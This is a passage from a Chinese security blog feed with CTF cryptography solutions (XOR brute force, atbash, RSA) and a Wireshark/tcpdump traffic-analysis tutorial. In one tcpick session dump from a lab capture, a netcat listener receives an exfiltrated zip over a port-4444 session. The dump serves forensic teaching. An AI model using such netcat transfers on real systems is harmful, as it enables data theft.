class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s=<span class="string">&#x27;TkVLTFdUQVpvUlNda1ZXRUpAZVldTltgJCQhLCAgGSknPjc=&#x27;</span></span><br><span class="line">s=base64.b64decode(s)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">k=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">res=j^(k+i)</span><br><span class="line">flag+=chr(res)</span><br><span class="line">k+=<span class="number">1</span></span><br><span class="line">print(i,flag)</span><br></pre></td></tr></table></figure><h3 id="有趣起来了"><a href="#有趣起来了" class="headerlink" title="有趣起来了"></a>有趣起来了</h3><p>密⽂前部分应该是HDCTF 所以应该是置换成字⺟倒序 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">de =<span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#123;&#125;&#x27;</span></span><br><span class="line">en = <span class="string">&#x27;zyxwvutsrqponmlkjihgfedcba&#123;&#125;&#x27;</span></span><br><span class="line">string = <span class="string">&#x27;swxgu&#123;nlivrmgvivhgrmtxlwv&#125;&#x27;</span></span><br><span class="line">output = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">28</span>): </span><br><span class="line">        <span class="keyword">if</span> i == en[j]: </span><br><span class="line">            output+=de[j] </span><br><span class="line">            print(output)</span><br></pre></td></tr></table></figure><h3 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h3><p>给出一个endeocde.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> a2b_hex,b2a_hex</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;*****************************&quot;</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">262248800182277040650192055439906580479</span></span><br><span class="line">q = <span class="number">262854994239322828547925595487519915551</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65533</span></span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">c = pow(int(b2a_hex(flag),<span class="number">16</span>),e,n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> c</span><br><span class="line">c = <span class="number">68405618655091231850901459679785989915772760467494039910176075122809565696913</span></span><br></pre></td></tr></table></figure><p>拿到p、q、c、e，我们可以求出d。</p><h2 id="网题"><a href="#网题" class="headerlink" title="网题"></a>网题</h2><h3 id="天干地支"><a href="#天干地支" class="headerlink" title="天干地支"></a>天干地支</h3><p><img src="file://C:/Users/12521/Desktop/md/35.png?lastModify=1604280427" alt="35"></p><p>天干有十个，地支有十二个，六十甲子<br> 题目提示天干地支+甲子<br> 所以这里用刚刚文件里的内容对照甲子的顺序数+60，通过ASCII码转换得到flag。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CTF-密码题&quot;&gt;&lt;a href=&quot;#CTF-密码题&quot; class=&quot;headerlink&quot; title=&quot;CTF-密码题&quot;&gt;&lt;/a&gt;CTF-密码题&lt;/h1&gt;&lt;h2 id=&quot;Base64&quot;&gt;&lt;a href=&quot;#Base64&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    <category term="CTF-密码" scheme="http://s1eady.top/categories/CTF-%E5%AF%86%E7%A0%81/"/>
    
    
    <category term="CTF-密码" scheme="http://s1eady.top/tags/CTF-%E5%AF%86%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>流量分析--Wireshark使用</title>
    <link href="http://s1eady.top/2020/11/22/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90--Wireshark%E4%BD%BF%E7%94%A8/"/>
    <id>http://s1eady.top/2020/11/22/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90--Wireshark%E4%BD%BF%E7%94%A8/</id>
    <published>2020-11-22T02:11:12.000Z</published>
    <updated>2020-11-06T11:22:21.348Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h1><h2 id="文件导出功能"><a href="#文件导出功能" class="headerlink" title="文件导出功能"></a>文件导出功能</h2><h3 id="http导出功能"><a href="#http导出功能" class="headerlink" title="http导出功能"></a>http导出功能</h3><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/50.png" alt="50"></p><h3 id="foremost分离"><a href="#foremost分离" class="headerlink" title="foremost分离"></a>foremost分离</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foremost 1.jpg</span><br></pre></td></tr></table></figure><h3 id="tcpxtract"><a href="#tcpxtract" class="headerlink" title="tcpxtract"></a>tcpxtract</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady$ tcpxtract -f &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;attachment.pcapng</span><br><span class="line">Found file of type &quot;zip&quot; in session [192.168.56.2:4244 -&gt; 192.168.56.104:23825], exporting to 00000000.zip</span><br></pre></td></tr></table></figure><h3 id="NetworkMiner"><a href="#NetworkMiner" class="headerlink" title="NetworkMiner"></a>NetworkMiner</h3><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/49.png" alt="49"></p><h2 id="分析TCP"><a href="#分析TCP" class="headerlink" title="分析TCP"></a>分析TCP</h2><h3 id="tcpick"><a href="#tcpick" class="headerlink" title="tcpick"></a>tcpick</h3><p>由于网络通信协议众多，TCP连接状态众多，所以TCP分析较为复杂。Kali  Linux提供一款专用工具tcpick。该工具支持在线实时嗅探和离线文件嗅探。它可以自动过滤出TCP流，并列出不同出TCP的相关信息，如源和目标地址/端口号、连接状态。该工具可以自动重组流数据，按照不同的格式进行保存。同时，该工具可以在终端以多种显示重组前和重组后的数据包内容，便于用户进行分析。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~/桌面/steady$ /usr/sbin/tcpick -C -yP -r attachment.pcapng</span><br><span class="line">Starting tcpick <span class="number">0.2</span><span class="number">.1</span> at <span class="number">2020</span><span class="number">-11</span><span class="number">-05</span> <span class="number">18</span>:<span class="number">42</span> CST</span><br><span class="line">Timeout <span class="keyword">for</span> connections <span class="keyword">is</span> <span class="number">600</span></span><br><span class="line">tcpick: reading <span class="keyword">from</span> attachment.pcapng</span><br><span class="line"><span class="number">1</span>      SYN-SENT       <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">55366</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4444</span></span><br><span class="line"><span class="number">1</span>      SYN-RECEIVED   <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">55366</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4444</span></span><br><span class="line"><span class="number">1</span>      ESTABLISHED    <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">55366</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4444</span></span><br><span class="line">nc -l -p <span class="number">4445</span> &gt; flag.zip</span><br><span class="line"><span class="number">2</span>      SYN-SENT       <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">37904</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4445</span></span><br><span class="line"><span class="number">2</span>      SYN-RECEIVED   <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">37904</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4445</span></span><br><span class="line"><span class="number">2</span>      ESTABLISHED    <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">37904</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4445</span></span><br><span class="line">PK....  ...NdbN..,.%...........flag.txtUT       ....z\..z\ux.............</span><br><span class="line">..(.y..z.. ..F.......:...<span class="comment">#B z..:...YPK....,.%.......PK......    ...NdbN..,.%.........................flag.txtUT.....z\ux.............PK..........N...w.....                                                                                                     </span></span><br><span class="line"><span class="number">2</span>      FIN-WAIT<span class="number">-1</span>     <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">37904</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4445</span></span><br><span class="line"><span class="number">2</span>      FIN-WAIT<span class="number">-2</span>     <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">37904</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4445</span></span><br><span class="line"><span class="number">2</span>      TIME-WAIT      <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">37904</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4445</span></span><br><span class="line"><span class="number">2</span>      CLOSED         <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">37904</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4445</span></span><br><span class="line">unzip -P supercomplexpassword flag.zip</span><br><span class="line">Archive:  flag.zip</span><br><span class="line">  inflating: flag.txt                </span><br><span class="line"></span><br><span class="line"><span class="number">1</span>      FIN-WAIT<span class="number">-1</span>     <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">55366</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4444</span></span><br><span class="line"><span class="number">1</span>      TIME-WAIT      <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">55366</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4444</span></span><br><span class="line"><span class="number">1</span>      CLOSED         <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">55366</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4444</span></span><br><span class="line">tcpick: done reading <span class="keyword">from</span> attachment.pcapng</span><br><span class="line"></span><br><span class="line"><span class="number">24</span> packets captured                                                                                                             </span><br><span class="line"><span class="number">2</span> tcp sessions detected</span><br></pre></td></tr></table></figure><h2 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h2><h3 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">client -&gt; server: SYN</span><br><span class="line">server -&gt; client: SYN+ACK</span><br><span class="line">client -&gt; server: ACK</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">02:52:44.513700 IP 172.17.0.9.41038 &gt; 93.184.216.34.80: Flags [S] , seq 3310420140,                 length 0</span><br><span class="line">02:52:44.692890 IP 93.184.216.34.80 &gt; 172.17.0.9.41038: Flags [S.], seq 1353235534, ack 3310420141, length 0</span><br><span class="line">02:52:44.692953 IP 172.17.0.9.41038 &gt; 93.184.216.34.80: Flags [.] ,                 ack 1353235535, length 0</span><br></pre></td></tr></table></figure><h4 id="第一次握手-SYN"><a href="#第一次握手-SYN" class="headerlink" title="第一次握手: SYN"></a>第一次握手: SYN</h4><p><code>#1</code> 包含以下信息：</p><ol><li><code>02:52:44.513700</code> 时刻，客户端主动向 server（93.184.216.34）发起一个 SYN 请求，请求建立连接</li><li>客户端请求的<strong>服务端端口是 80</strong>（HTTP 服务默认 80 端口），客户端使用的是<strong>临时端口</strong>（大于 1024）41038</li><li><code>#1</code> 序列号是 <code>3310420140</code>，这是客户端的初始序列号（客户端和服务端分别维护自己的序列号，两者没有关系；另外，初始序列号是系统选择的，一般不是 0）</li><li><code>#1</code> length 为 0，因为 SYN 包不带 TCP payload，所有信息都在 TCP header</li></ol><h4 id="第二次握手-SYN-ACK"><a href="#第二次握手-SYN-ACK" class="headerlink" title="第二次握手: SYN+ACK"></a>第二次握手: SYN+ACK</h4><p><code>#2</code> 的 ack 是 <code>3310420140</code>，等于 <code>#1</code> 的 seq 加 1，这就说明，<code>#2</code> 是 <code>#1</code> 的应 答包。</p><p>这个应答包的特点：</p><ol><li>TCP flags 为 <code>S.</code>，即 SYN+ACK</li><li>length 也是 0，说明没有 payload</li><li>seq 为 <code>1353235534</code>，这是<strong>服务端的初始序列号</strong></li><li>到达 eth0 的时间为 <code>02:52:44.692890</code>，说明时间过了 <code>18ms</code></li></ol><h4 id="第三次握手-ACK"><a href="#第三次握手-ACK" class="headerlink" title="第三次握手: ACK"></a>第三次握手: ACK</h4><p>同理，<code>#3</code> 的 ack 等于 <code>#2</code> 的 seq 加 1，说明 <code>#3</code> 是 <code>#2</code> 的应答包。</p><p>这个包的特点：</p><ol><li>TCP flags 为 <code>.</code>，即 ACK</li><li>长度为 0，说明没有 TCP payload</li></ol><p>至此，三次握手完成。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~/桌面/steady$ /usr/sbin/tcpdump  -n -r nmapll.pcapng <span class="string">&#x27;tcp[13] = 18&#x27;</span> |  awk <span class="string">&#x27;&#123;print $3&#125;&#x27;</span>| sort -u</span><br><span class="line">reading <span class="keyword">from</span> file nmapll.pcapng, link-type EN10MB (Ethernet)</span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="number">.21</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="number">.22</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="number">.3306</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="number">.631</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="number">.801</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~/桌面/steady$ /usr/sbin/tcpdump  -r nmapll.pcapng <span class="string">&#x27;tcp[13] = 18&#x27;</span> |  awk <span class="string">&#x27;&#123;print $3&#125;&#x27;</span>| sort -u</span><br><span class="line">reading <span class="keyword">from</span> file nmapll.pcapng, link-type EN10MB (Ethernet)</span><br><span class="line">localhost<span class="number">.801</span></span><br><span class="line">localhost.ftp</span><br><span class="line">localhost.ipp</span><br><span class="line">localhost.mysql</span><br><span class="line">localhost.ssh</span><br></pre></td></tr></table></figure><h3 id="输出分析"><a href="#输出分析" class="headerlink" title="输出分析"></a>输出分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady$ tcpdump -r attachment.pcapng | head -n 10</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">14</span>:<span class="number">29</span>:<span class="number">32.848771</span> IP <span class="number">192.168</span><span class="number">.10</span><span class="number">.212</span><span class="number">.43424</span> &gt; li370<span class="number">-223.</span>members.linode.com.https: Flags [S], seq <span class="number">3990734865</span>, win <span class="number">29200</span>, options [mss <span class="number">1460</span>,sackOK,TS val <span class="number">668024057</span> ecr <span class="number">0</span>,nop,wscale <span class="number">7</span>], length <span class="number">0</span></span><br></pre></td></tr></table></figure><ul><li>packet <strong>时间戳</strong>，例如 <code>02:52:44.513700</code> 表示抓到这个包的时间是** 02 时 52 分 44 秒 513 毫秒**</li><li>packet <strong>类型</strong>，这里是 <code>IP</code> 包</li><li>源 (SRC) IP 和端口，目的 (DST) IP 和端口</li><li>packet TCP flags，其中<ul><li><code>S</code> 表示 <code>syn</code> 包</li><li><code>.</code> 表示 <code>ack</code> 包</li><li><code>F</code> 表示 <code>fin</code> 包</li><li><code>P</code> 表示 <code>push</code> 包（发送正常数据）</li></ul></li><li>序列号（seq）</li><li>应答号（ack）</li><li>包的 payload 长度</li><li>包的部分内容（ASCII）</li></ul><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-n  不对地址(比如, 主机地址, 端口号)进行数字表示到名字表示的转换.默认情况下，tcpdump抓包结果中将进行域名解析，显示的是域名地址而非ip地址，使用-n选项，可指定显示ip地址</span><br><span class="line">-r  file</span><br><span class="line">    从文件file 中读取包数据. 如果file 字段为 &#39;-&#39; 符号, 则tcpdump 会从标准输入中读取包数据.</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line">-A  以ASCII码方式显示每一个数据包(不会显示数据包中链路层头部信息). 在抓取包含</span><br><span class="line">    网页数据的数据包时, 可方便查看数据(nt: 即Handy <span class="keyword">for</span> capturing web pages).</span><br><span class="line">-c  count</span><br><span class="line">    tcpdump将在接受到count个数据包后退出.</span><br><span class="line">-C  file-size</span><br><span class="line">    (nt: 此选项用于配合-w file 选项使用)</span><br><span class="line">    该选项使得tcpdump 在把原始数据包直接保存到文件中之前, 检查此文件大小是否超过file-size. 如果超过了, 将关闭此文件,</span><br><span class="line">    另创一个文件继续用于原始数据包的记录. 新创建的文件名与-w 选项指定的文件名一致, 但文件名后多了一个数字.</span><br><span class="line">    该数字会从<span class="number">1</span>开始随着新创建文件的增多而增加. file-size的单位是百万字节(nt: 这里指<span class="number">1</span>,<span class="number">000</span>,<span class="number">000</span>个字节,</span><br><span class="line">    并非<span class="number">1</span>,<span class="number">048</span>,<span class="number">576</span>个字节, 后者是以<span class="number">1024</span>字节为<span class="number">1</span>k, <span class="number">1024</span>k字节为<span class="number">1</span>M计算所得, 即<span class="number">1</span>M=<span class="number">1024</span> ＊ <span class="number">1024</span> ＝ <span class="number">1</span>,<span class="number">048</span>,<span class="number">576</span>)</span><br><span class="line">-d  以容易阅读的形式,在标准输出上打印出编排过的包匹配码, 随后tcpdump停止.(nt | rt: human readable, 容易阅读的,</span><br><span class="line">    通常是指以ascii码来打印一些信息. compiled, 编排过的. packet-matching code, 包匹配码,含义未知, 需补充)</span><br><span class="line">-dd 以C语言的形式打印出包匹配码.</span><br><span class="line">-ddd    以十进制数的形式打印出包匹配码(会在包匹配码之前有一个附加的<span class="string">&#x27;count&#x27;</span>前缀).</span><br><span class="line">-D  打印系统中所有tcpdump可以在其上进行抓包的网络接口. 每一个接口会打印出数字编号, 相应的接口名字, 以及可能的一个网络接口</span><br><span class="line">    描述. 其中网络接口名字和数字编号可以用在tcpdump 的-i flag 选项(nt: 把名字或数字代替flag), 来指定要在其上抓包的网络</span><br><span class="line">    接口.</span><br><span class="line">    此选项在不支持接口列表命令的系统上很有用(nt: 比如, Windows 系统, 或缺乏 ifconfig -a 的UNIX系统); 接口的数字</span><br><span class="line">    编号在windows <span class="number">2000</span> 或其后的系统中很有用, 因为这些系统上的接口名字比较复杂, 而不易使用.</span><br><span class="line">    如果tcpdump编译时所依赖的libpcap库太老,-D 选项不会被支持, 因为其中缺乏 pcap_findalldevs()函数.</span><br><span class="line">-e  每行的打印输出中将包括数据包的数据链路层头部信息</span><br><span class="line">-E  spi@ipaddr algo:secret,...</span><br><span class="line">    可通过spi@ipaddr algo:secret 来解密IPsec ESP包(nt | rt:IPsec Encapsulating Security Payload,</span><br><span class="line">    IPsec 封装安全负载, IPsec可理解为, 一整套对ip数据包的加密协议, ESP 为整个IP 数据包或其中上层协议部分被加密后的数据,</span><br><span class="line">    前者的工作模式称为隧道模式; 后者的工作模式称为传输模式 . 工作原理, 另需补充).</span><br><span class="line">    需要注意的是, 在终端启动tcpdump 时, 可以为IPv4 ESP packets 设置密钥(secret）.</span><br><span class="line">    可用于加密的算法包括des-cbc, <span class="number">3</span>des-cbc, blowfish-cbc, rc3-cbc, cast128-cbc, 或者没有(none).</span><br><span class="line">    默认的是des-cbc(nt: des, Data Encryption Standard, 数据加密标准, 加密算法未知, 另需补充).</span><br><span class="line">    secret 为用于ESP 的密钥, 使用ASCII 字符串方式表达. 如果以 <span class="number">0</span>x 开头, 该密钥将以<span class="number">16</span>进制方式读入.</span><br><span class="line">    该选项中ESP 的定义遵循RFC2406, 而不是 RFC1827. 并且, 此选项只是用来调试的, 不推荐以真实密钥(secret)来</span><br><span class="line">    使用该选项, 因为这样不安全: 在命令行中输入的secret 可以被其他人通过ps 等命令查看到.</span><br><span class="line">    除了以上的语法格式(nt: 指spi@ipaddr algo:secret), 还可以在后面添加一个语法输入文件名字供tcpdump 使用</span><br><span class="line">    (nt：即把spi@ipaddr algo:secret,... 中...换成一个语法文件名). 此文件在接受到第一个ESP　包时会打开此</span><br><span class="line">    文件, 所以最好此时把赋予tcpdump 的一些特权取消(nt: 可理解为, 这样防范之后, 当该文件为恶意编写时,</span><br><span class="line">    不至于造成过大损害).</span><br><span class="line">-f  显示外部的IPv4 地址时(nt: foreign IPv4 addresses, 可理解为, 非本机ip地址), 采用数字方式而不是名字.</span><br><span class="line">    (此选项是用来对付Sun公司的NIS服务器的缺陷(nt: NIS, 网络信息服务, tcpdump 显示外部地址的名字时会</span><br><span class="line">    用到她提供的名称服务): 此NIS服务器在查询非本地地址名字时,常常会陷入无尽的查询循环).</span><br><span class="line">    由于对外部(foreign)IPv4地址的测试需要用到本地网络接口(nt: tcpdump 抓包时用到的接口)</span><br><span class="line">    及其IPv4 地址和网络掩码. 如果此地址或网络掩码不可用, 或者此接口根本就没有设置相应网络地址和网络</span><br><span class="line">    掩码(nt: linux 下的 <span class="string">&#x27;any&#x27;</span> 网络接口就不需要设置地址和掩码, 不过此<span class="string">&#x27;any&#x27;</span>接口可以收到系统中所有接口的</span><br><span class="line">    数据包), 该选项不能正常工作.</span><br><span class="line">-F  file</span><br><span class="line">    使用file 文件作为过滤条件表达式的输入, 此时命令行上的输入将被忽略.</span><br><span class="line">-i  interface</span><br><span class="line">    指定tcpdump 需要监听的接口.  如果没有指定, tcpdump 会从系统接口列表中搜寻编号最小的已配置好的接口(不包括 loopback 接口).</span><br><span class="line">    一但找到第一个符合条件的接口, 搜寻马上结束.</span><br><span class="line">    在采用<span class="number">2.2</span>版本或之后版本内核的Linux 操作系统上, <span class="string">&#x27;any&#x27;</span> 这个虚拟网络接口可被用来接收所有网络接口上的数据包</span><br><span class="line">    (nt: 这会包括目的是该网络接口的, 也包括目的不是该网络接口的). 需要注意的是如果真实网络接口不能工作在<span class="string">&#x27;混杂&#x27;</span>模式(promiscuous)下,</span><br><span class="line">    则无法在<span class="string">&#x27;any&#x27;</span>这个虚拟的网络接口上抓取其数据包.</span><br><span class="line">    如果 -D 标志被指定, tcpdump会打印系统中的接口编号，而该编号就可用于此处的interface 参数.</span><br><span class="line">-l  对标准输出进行行缓冲(nt: 使标准输出设备遇到一个换行符就马上把这行的内容打印出来).</span><br><span class="line">    在需要同时观察抓包打印以及保存抓包记录的时候很有用. 比如, 可通过以下命令组合来达到此目的:</span><br><span class="line">    ``tcpdump  -l  |  tee dat<span class="string">&#x27;&#x27;</span> 或者 ``tcpdump  -l   &gt; dat  &amp;  tail  -f  dat<span class="string">&#x27;&#x27;</span>.</span><br><span class="line">    (nt: 前者使用tee来把tcpdump 的输出同时放到文件dat和标准输出中, 而后者通过重定向操作<span class="string">&#x27;&gt;&#x27;</span>, 把tcpdump的输出放到</span><br><span class="line">    dat 文件中, 同时通过tail把dat文件中的内容放到标准输出中)</span><br><span class="line">-L  列出指定网络接口所支持的数据链路层的类型后退出.(nt: 指定接口通过-i 来指定)</span><br><span class="line">-m  module</span><br><span class="line">    通过module 指定的file 装载SMI MIB 模块(nt: SMI，Structure of Management Information, 管理信息结构</span><br><span class="line">    MIB, Management Information Base, 管理信息库. 可理解为, 这两者用于SNMP(Simple Network Management Protoco)</span><br><span class="line">    协议数据包的抓取. 具体SNMP 的工作原理未知, 另需补充).</span><br><span class="line">    此选项可多次使用, 从而为tcpdump 装载不同的MIB 模块.</span><br><span class="line">-M  secret</span><br><span class="line">    如果TCP 数据包(TCP segments)有TCP-MD5选项(在RFC <span class="number">2385</span>有相关描述), 则为其摘要的验证指定一个公共的密钥secret.</span><br><span class="line">-n  不对地址(比如, 主机地址, 端口号)进行数字表示到名字表示的转换.</span><br><span class="line">-N  不打印出host 的域名部分. 比如, 如果设置了此选现, tcpdump 将会打印<span class="string">&#x27;nic&#x27;</span> 而不是 <span class="string">&#x27;nic.ddn.mil&#x27;</span>.</span><br><span class="line">-O 